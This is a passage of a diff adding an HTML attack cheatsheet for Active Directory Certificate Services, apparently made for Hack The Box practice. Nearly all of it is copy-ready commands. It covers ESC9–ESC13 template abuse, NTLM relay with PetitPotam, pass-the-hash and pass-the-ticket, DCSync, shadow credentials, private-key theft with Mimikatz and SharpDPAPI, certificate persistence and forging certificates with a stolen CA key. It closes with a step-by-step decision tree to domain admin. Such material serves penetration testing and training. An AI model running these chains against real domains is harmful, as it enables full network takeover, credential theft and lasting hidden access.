+        <span class="cm"># Step 4: Authenticate with the DC certificate (PKINIT)</span>
+        certipy auth -pfx DC.pfx -domain domain.htb -dc-ip $DC
+        <span class="cm"># Gets: DC$'s NTLM hash + TGT</span>
+
+        <span class="cm"># Step 5: DCSync with the DC machine account hash</span>
+        impacket-secretsdump -hashes :DC_NTLM_HASH 'domain.htb/DC$'@$DC
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc9-esc10-no-security-extension-weak-cert-mapping" style="margin-top:36px"><span
+        class="sec-title">ESC9 & ESC10 — No Security Extension / Weak Cert Mapping</span><span class="sec-line"></span>
+    </div>
+    <h3 class="md-h3" id="esc9-no-security-extension">ESC9 — No Security Extension</h3>
+    <p class="md-p">The template has <code class="inline-code">CT_FLAG_NO_SECURITY_EXTENSION</code> — the issued cert
+      doesn't embed the SID of the requesting user. Combined with ability to change UPN, allows impersonation.</p>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Requirements: GenericWrite on a user account + ESC9 template
+          available</span>
+
+        <span class="cm"># Step 1: Change target user's UPN to administrator's UPN</span>
+        certipy account update -u attacker@domain.htb -p 'pass' -user victim_user -upn administrator -dc-ip $DC
+
+        <span class="cm"># Step 2: Request cert as victim_user (the UPN now maps to administrator)</span>
+        certipy req -u victim_user@domain.htb -p 'victimpass' -ca CA-NAME -template ESC9Template -dc-ip $DC
+
+        <span class="cm"># Step 3: Restore victim user's UPN</span>
+        certipy account update -u attacker@domain.htb -p 'pass' -user victim_user -upn victim_user@domain.htb -dc-ip $DC
+
+        <span class="cm"># Step 4: Authenticate with cert (maps to administrator due to UPN)</span>
+        certipy auth -pfx victim_user.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="esc10-weak-certificate-mapping">ESC10 — Weak Certificate Mapping</h3>
+    <p class="md-p">Registry key <code class="inline-code">CertificateMappingMethods</code> has bit 0x4 set (Subject) or
+      StrongCertificateBindingEnforcement = 0. Similar to ESC9 but abuses the DC's cert mapping.</p>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Same approach as ESC9 — check certipy output for ESC10 flag</span>
+        certipy find -vulnerable -stdout
+        <span class="cm"># If ESC10: follow same UPN swap technique as ESC9</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc11-relay-icpr" style="margin-top:36px"><span class="sec-title">ESC11 — Relay
+        ICPR</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">The CA's RPC interface (<code class="inline-code">\pipe\cert</code>) does not enforce signing,
+      allowing NTLM relay over RPC (port 135/445) to the CA.</p>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Detection</span>
+        certipy find -vulnerable -stdout
+        <span class="cm"># Look for: ESC11 — Enforce Encryption for Requests: Disabled</span>
+
+        <span class="cm"># Exploitation — relay via certipy</span>
+        certipy relay -ca $CA_SERVER -template DomainController -target rpc://$CA_SERVER
+
+        <span class="cm"># Trigger auth same as ESC8 (PetitPotam, PrinterBug, etc.)</span>
+        python3 PetitPotam.py $LHOST $DC
+
+        <span class="cm"># Then authenticate with obtained cert</span>
+        certipy auth -pfx DC.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc13-oid-group-link" style="margin-top:36px"><span class="sec-title">ESC13 — OID Group
+        Link</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">A certificate template links to a group via an OID (issuance policy). When a user requests a cert
+      from this template, they inherit the group's permissions — even if they're not actually a member.</p>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Detection</span>
+        certipy find -vulnerable -stdout
+        <span class="cm"># Look for: ESC13</span>
+        <span class="cm"># Group Linked: high-privilege-group</span>
+
+        <span class="cm"># Exploitation</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template ESC13Template -dc-ip $DC
+        <span class="cm"># The cert includes OID linking to high-priv group</span>
+
+        <span class="cm"># Authenticate — you'll have the group's permissions</span>
+        certipy auth -pfx user.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="using-certificates-authentication-ptt" style="margin-top:36px"><span
+        class="sec-title">Using Certificates — Authentication & PTT</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="certipy-auth-linux">Certipy Auth (Linux)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Authenticate with PFX → get NTLM hash + TGT</span>
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC -username administrator
+
+        <span class="cm"># If cert is password protected</span>
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC -pfx-password 'certpass'
+
+        <span class="cm"># Output:</span>
+        <span class="cm"># Trying to get TGT...</span>
+        <span class="cm"># Got TGT: Saved to administrator.ccache</span>
+        <span class="cm"># Got NTLM hash: aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE</span>
+
+        <span class="cm"># Use TGT</span>
+        export KRB5CCNAME=administrator.ccache
+        impacket-psexec -k -no-pass administrator@$DC
+        impacket-secretsdump -k -no-pass domain.htb/administrator@$DC
+
+        <span class="cm"># Use NTLM hash</span>
+        evil-winrm -i $IP -u administrator -H NTLM_HASH
+        impacket-psexec -hashes :NTLM_HASH administrator@$IP
+        crackmapexec smb $IP -u administrator -H NTLM_HASH
+      </div>
+    </div>
+    <h3 class="md-h3" id="pkinittools-alternative-linux-auth">PKINITtools (Alternative Linux Auth)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Get TGT using cert (if certipy auth fails)</span>
+        python3 PKINITtools/gettgtpkinit.py -cert-pfx administrator.pfx domain.htb/administrator administrator.ccache
+        export KRB5CCNAME=administrator.ccache
+
+        <span class="cm"># Get NTLM hash from TGT</span>
+        python3 PKINITtools/getnthash.py -key SESSION_KEY domain.htb/administrator
+        <span class="cm"># (SESSION_KEY is shown in gettgtpkinit output)</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="rubeus-windows">Rubeus (Windows)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Request TGT from PFX
+        .\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:"" /nowrap /ptt
+
+        :: Get credentials (NTLM) from cert
+        .\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials /show /nowrap
+
+        :: Pass-the-Ticket
+        .\Rubeus.exe ptt /ticket:BASE64_TICKET</div>
+    </div>
+    <h3 class="md-h3" id="convert-certificate-formats">Convert Certificate Formats</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># PEM (cert + key separate) → PFX</span>
+        openssl pkcs12 -in cert.pem -inkey key.pem -export -out cert.pfx -passout pass:""
+
+        <span class="cm"># PEM (cert + key combined in one file) → PFX</span>
+        openssl pkcs12 -in combined.pem -export -out cert.pfx -passout pass:""
+
+        <span class="cm"># PFX → PEM</span>
+        openssl pkcs12 -in cert.pfx -out cert.pem -nodes
+
+        <span class="cm"># PFX with password</span>
+        openssl pkcs12 -in cert.pfx -out cert.pem -nodes -passin pass:certpassword
+
+        <span class="cm"># Kirbi ↔ ccache</span>
+        impacket-ticketConverter ticket.kirbi ticket.ccache
+        impacket-ticketConverter ticket.ccache ticket.kirbi
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="post-exploitation-with-certificates" style="margin-top:36px"><span
+        class="sec-title">Post-Exploitation with Certificates</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="shadow-credentials-alternative-to-adcs-esc-attacks">Shadow Credentials (Alternative to ADCS
+      ESC attacks)</h3>
+    <p class="md-p">If you have <strong>GenericWrite</strong> on a user or computer object, you can add a certificate to
+      their <code class="inline-code">msDS-KeyCredentialLink</code> attribute, then authenticate as them.</p>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># From Linux — pywhisker</span>
+        python3 pywhisker/pywhisker.py -d domain.htb -u attacker -p 'pass' --target victim_user --action add --dc-ip $DC
+        <span class="cm"># Outputs: cert saved to FILENAME.pfx, device ID</span>
+
+        <span class="cm"># Authenticate</span>
+        certipy auth -pfx FILENAME.pfx -domain domain.htb -dc-ip $DC -username victim_user
+
+        <span class="cm"># From Windows — Whisker</span>
+        .\Whisker.exe add /target:victim_user
+        <span class="cm"># Outputs: Rubeus command to use</span>
+        .\Rubeus.exe asktgt /user:victim_user /certificate:BASE64 /password:PASSWORD /getcredentials /show
+
+        <span class="cm"># Shadow Credentials on computer accounts (for SYSTEM)</span>
+        python3 pywhisker/pywhisker.py -d domain.htb -u attacker -p 'pass' --target "DC$" --action add --dc-ip $DC
+        certipy auth -pfx FILENAME.pfx -domain domain.htb -dc-ip $DC -username "DC$"
+        <span class="cm"># Gets DC machine account TGT → DCSync!</span>
+        impacket-secretsdump -k -no-pass domain.htb/'DC$'@$DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="certipy-shadow-integrated">Certipy Shadow (Integrated)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Add shadow credential</span>
+        certipy shadow auto -u attacker@domain.htb -p 'pass' -account victim_user -dc-ip $DC
+        <span class="cm"># All-in-one: adds cert, authenticates, gets hash, restores msDS-KeyCredentialLink</span>
+
+        <span class="cm"># Manual steps</span>
+        certipy shadow add -u attacker@domain.htb -p 'pass' -account victim_user -dc-ip $DC
+        certipy auth -pfx victim_user.pfx -domain domain.htb -dc-ip $DC
+        certipy shadow remove -u attacker@domain.htb -p 'pass' -account victim_user -device-id DEVICE-ID -dc-ip $DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="extract-private-keys-from-windows">Extract Private Keys from Windows</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Export current user certs (with private key if marked exportable)
+        certmgr.msc :: GUI
+
+        :: PowerShell — export all user certs
+        Get-ChildItem Cert:\CurrentUser\My -ExportType Pkcs12 | Export-PfxCertificate -FilePath C:\Temp\certs.pfx
+        -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)
+
+        :: Via Mimikatz (even non-exportable certs)
+        .\mimikatz.exe
+        crypto::capi
+        privilege::debug
+        crypto::cng
+        crypto::certificates /export
+        crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+        :: Saves to current directory as .der files
+
+        :: SharpDPAPI (extract cert private keys via DPAPI)
+        .\SharpDPAPI.exe certificates /mkfile:masterkeyfile</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="persistence-via-certificates" style="margin-top:36px"><span class="sec-title">Persistence
+        via Certificates</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="why-certs-are-great-for-persistence">Why Certs Are Great for Persistence</h3>
+    <p class="md-p">Certificates are valid for their <strong>full lifetime</strong> (1-2 years typically), don't change
+      when a user changes their password, and are harder to detect than golden tickets.</p>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Request a cert for a DA (after compromise) — persists for years</span>
+        certipy req -u administrator@domain.htb -p 'pass' -ca CA-NAME -template User -dc-ip $DC
+        <span class="cm"># Store administrator.pfx securely</span>
+
+        <span class="cm"># Even after password reset, the cert still authenticates</span>
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="forge-certificates-with-ca-key-post-full-compromise">Forge Certificates with CA Key
+      (Post-Full-Compromise)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># If you have the CA private key (from compromised CA server):</span>
+        <span class="cm"># Extract CA cert and key with Certipy</span>
+        certipy ca -backup -u administrator@domain.htb -p 'pass' -ca CA-NAME -dc-ip $DC
+        <span class="cm"># Saves: CA-NAME.pfx</span>
+
+        <span class="cm"># Forge any certificate offline (no network needed)</span>
+        certipy forge -ca-pfx CA-NAME.pfx -upn administrator@domain.htb -subject
+        'CN=Administrator,CN=Users,DC=domain,DC=htb'
+        <span class="cm"># Saves: administrator_forged.pfx</span>
+
+        <span class="cm"># Authenticate with forged cert</span>
+        certipy auth -pfx administrator_forged.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="steal-ca-private-key-via-dpapi">Steal CA Private Key via DPAPI</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># From Windows (as admin/SYSTEM on CA server)</span>
+        <span class="cm"># SharpDPAPI</span>
+        .\SharpDPAPI.exe certificates /machine /mkfile:C:\Temp\masterkeys.txt
+
+        <span class="cm"># Mimikatz</span>
+        .\mimikatz.exe
+        privilege::debug
+        crypto::capi
+        crypto::cng
+        crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="quick-attack-decision-tree" style="margin-top:36px"><span class="sec-title">Quick Attack
+        Decision Tree</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">Got domain user creds?
+        │
+        ▼
+        certipy find -vulnerable
+        │
+        ├─► ESC1/ESC2/ESC6 ──► certipy req (specify admin UPN) ──► certipy auth ──► DOMAIN ADMIN
+        │
+        ├─► ESC3 ──► Request agent cert → use to enroll as admin ──► certipy auth ──► DA
+        │
+        ├─► ESC4 ──► Modify template to ESC1 ──► certipy req ──► certipy auth ──► DA
+        │
+        ├─► ESC7 ──► ManageCA: enable EDITF flag → ESC6 path
+        │ ManageCerts: approve pending → get cert ──► DA
+        │
+        ├─► ESC8/ESC11 ──► NTLM relay (PetitPotam/PrinterBug) → relay to CA ──► DC cert ──► DCSync
+        │
+        └─► No ESC found?
+        │
+        ├─► GenericWrite on user/computer? ──► Shadow Credentials (pywhisker) ──► certipy auth
+        │
+        └─► Check BloodHound for cert-related edges: Enroll, AutoEnroll, WritePKIEnrollmentFlag</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="common-issues-fixes" style="margin-top:36px"><span class="sec-title">Common Issues &
+        Fixes</span><span class="sec-line"></span></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># "Clock skew too great" error</span>
+        sudo ntpdate $DC <span class="cm"># sync time with DC</span>
+        sudo timedatectl set-ntp false
+        sudo timedatectl set-time "$(date -d @$(sudo net time -S $DC | awk '{print $NF}') '+%Y-%m-%d %H:%M:%S')"
+
+        <span class="cm"># KRB5 errors</span>
+        export KRB5CCNAME=/full/path/to/ticket.ccache
+        <span class="cm"># Check /etc/krb5.conf has correct realm:</span>
+        [realms]
+        DOMAIN.HTB = { kdc = $DC }
+
+        <span class="cm"># Certificate auth fails with "KDC_ERR_PADATA_TYPE_NOSUPP"</span>
+        <span class="cm"># The DC doesn't support PKINIT (rare but possible)</span>
+        <span class="cm"># Try using NTLM hash instead (obtained via certipy auth still gives hash even if Kerberos
+          fails)</span>
+
+        <span class="cm"># "Certificate unknown" or "Not trusted"</span>
+        <span class="cm"># CA cert not trusted by the DC — try adding -ldap-channel-binding flag</span>
+        certipy auth -pfx cert.pfx -domain domain.htb -dc-ip $DC -ldap-channel-binding
+
+        <span class="cm"># Certipy "Failed to get TGT"</span>
+        <span class="cm"># Try with explicit username</span>
+        certipy auth -pfx cert.pfx -domain domain.htb -username administrator -dc-ip $DC
+
+        <span class="cm"># Template not found</span>
+        <span class="cm"># Verify CA name exactly:</span>
+        certipy find -u user@domain.htb -p pass -dc-ip $DC -stdout | grep "CA Name"
+
+        <span class="cm"># Request fails with "CERTSRV_E_TEMPLATE_DENIED"</span>
+        <span class="cm"># User doesn't have enrollment rights on that template</span>
+        <span class="cm"># Check: certipy find output — look for your user/group in Enrollment Rights</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <p class="md-p"><em>🔒 Built for HTB by 0xRoot | ADCS Attacks Appendix</em> <em>Use responsibly on authorized
+        systems only — HTB & authorized engagements only.</em></p>
+
+  </div>
+  <script>
+    initPage({
+      title: 'ADCS — Active Directory Certificate Services Attack Cheatsheet',
+      breadcrumb: 'cheatsheets/htb_ADCS_cheatsheet',
+      tags: [{ label: 'ADCS', color: 'red' }, { label: 'Certipy', color: 'blue' }],
+      extraSb: `
+      <div style="padding:13px 10px 6px;border-top:1px solid var(--border)">
+        <div class="sb-sec-lbl">contents</div>
+        <a href="#by-j0stif-esc1-through-esc13-full-exploitation-chain" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>by J0stif | ESC1 through ESC13 + Full Exploitation Chain</a>
+<a href="#table-of-contents" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>📋 TABLE OF CONTENTS</a>
+<a href="#adcs-overview-setup" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>🔧 ADCS Overview & Setup</a>
+<a href="#what-is-adcs" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What is ADCS?</a>
+<a href="#key-concepts" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Key Concepts</a>
+<a href="#tool-setup" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Tool Setup</a>
+<a href="#enumeration" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Enumeration</a>
+<a href="#certipy-from-kali" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Certipy (from Kali)</a>
+<a href="#certify-from-windows" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Certify (from Windows)</a>
+<a href="#manual-enumeration-via-ldap" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Manual Enumeration via LDAP</a>
+<a href="#bloodhound-adcs-queries" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>BloodHound ADCS Queries</a>
+<a href="#esc1-misconfigured-certificate-templates" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC1 — Misconfigured Certificate Templates</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#exploitation-certipy-linux" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation — Certipy (Linux)</a>
+<a href="#exploitation-certify-rubeus-windows" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation — Certify + Rubeus (Windows)</a>
+<a href="#alternative-upns-to-try" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Alternative UPNs to Try</a>
+<a href="#esc2-any-purpose-eku" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC2 — Any Purpose EKU</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation</a>
+<a href="#esc3-certificate-request-agent" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC3 — Certificate Request Agent</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation</a>
+<a href="#esc4-vulnerable-certificate-template-acl" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC4 — Vulnerable Certificate Template ACL</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation</a>
+<a href="#esc6-editfattributesubjectaltname2" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation</a>
+<a href="#esc7-vulnerable-ca-acl" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC7 — Vulnerable CA ACL</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#exploitation-manageca-esc6" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation — ManageCA → ESC6</a>
+<a href="#exploitation-managecertificates-approve-pending-requests" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation — ManageCertificates → Approve Pending Requests</a>
+<a href="#esc8-ntlm-relay-to-ad-cs-http-endpoints" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC8 — NTLM Relay to AD CS HTTP Endpoints</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#detection" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Detection</a>
+<a href="#exploitation" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Exploitation</a>
+<a href="#esc9-esc10-no-security-extension-weak-cert-mapping" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC9 & ESC10 — No Security Extension / Weak Cert Mapping</a>
+<a href="#esc9-no-security-extension" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC9 — No Security Extension</a>
+<a href="#esc10-weak-certificate-mapping" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC10 — Weak Certificate Mapping</a>
+<a href="#esc11-relay-icpr" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC11 — Relay ICPR</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#esc13-oid-group-link" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>ESC13 — OID Group Link</a>
+<a href="#what-makes-it-vulnerable" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>What Makes It Vulnerable</a>
+<a href="#using-certificates-authentication-ptt" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Using Certificates — Authentication & PTT</a>
+<a href="#certipy-auth-linux" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Certipy Auth (Linux)</a>
+<a href="#pkinittools-alternative-linux-auth" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>PKINITtools (Alternative Linux Auth)</a>
+<a href="#rubeus-windows" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Rubeus (Windows)</a>
+<a href="#convert-certificate-formats" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Convert Certificate Formats</a>
+<a href="#post-exploitation-with-certificates" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Post-Exploitation with Certificates</a>
+<a href="#shadow-credentials-alternative-to-adcs-esc-attacks" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Shadow Credentials (Alternative to ADCS ESC attacks)</a>
+<a href="#certipy-shadow-integrated" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Certipy Shadow (Integrated)</a>
+<a href="#extract-private-keys-from-windows" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Extract Private Keys from Windows</a>
+<a href="#persistence-via-certificates" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Persistence via Certificates</a>
+<a href="#why-certs-are-great-for-persistence" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Why Certs Are Great for Persistence</a>
+<a href="#forge-certificates-with-ca-key-post-full-compromise" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Forge Certificates with CA Key (Post-Full-Compromise)</a>
+<a href="#steal-ca-private-key-via-dpapi" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Steal CA Private Key via DPAPI</a>
